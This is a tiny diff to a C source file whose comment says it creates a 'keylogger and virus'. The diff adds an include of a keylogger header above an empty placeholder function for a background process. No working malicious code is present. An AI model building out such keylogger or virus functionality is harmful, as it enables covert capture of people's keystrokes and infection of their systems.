@@ -2,6 +2,8 @@
 Main function to run to create keylogger and virus
 */
 
+#include "keylogger.h"
+
 void background_process(void) {
   // IMPLEMENTATION HERE
 }
